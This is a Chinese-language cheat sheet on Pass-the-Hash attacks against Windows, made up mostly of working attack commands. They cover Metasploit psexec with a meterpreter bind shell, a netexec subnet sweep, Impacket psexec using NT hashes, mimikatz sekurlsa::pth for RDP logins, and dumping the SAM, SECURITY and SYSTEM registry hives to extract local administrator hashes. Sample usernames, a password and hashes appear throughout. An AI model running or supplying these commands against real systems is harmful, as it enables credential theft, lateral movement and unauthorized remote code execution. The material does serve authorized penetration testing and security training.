# 哈希 - Pass the Hash（哈希传递）

你可以用于哈希传递的哈希类型是 NT 或 NTLM 哈希。自 Windows Vista 起，攻击者已无法对非内置 RID 500 的本地管理员帐户进行哈希传递。

* Metasploit

  ```powershell
  use exploit/windows/smb/psexec
  set RHOST 10.2.0.3
  set SMBUser jarrieta
  set SMBPass nastyCutt3r  
  # 注意 1：密码可以替换为哈希来执行"哈希传递"攻击。
  # 注意 2：需要完整的 NT 哈希，你可能需要添加"空白"LM（aad3b435b51404eeaad3b435b51404ee）
  set PAYLOAD windows/meterpreter/bind_tcp
  run
  shell
  ```

* netexec

  ```powershell
  nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
  ```

* Impacket 套件

  ```powershell
  proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
  ```

* Windows RDP 和 mimikatz

  ```powershell
  sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
  sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:"mstsc.exe /restrictedadmin"
  ```

你可以提取本地 **SAM 数据库** 来查找本地管理员哈希：

```powershell
C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> reg.exe save hklm\security c:\temp\security.save
C:\> reg.exe save hklm\system c:\temp\system.save
$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## 参考资料

* [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
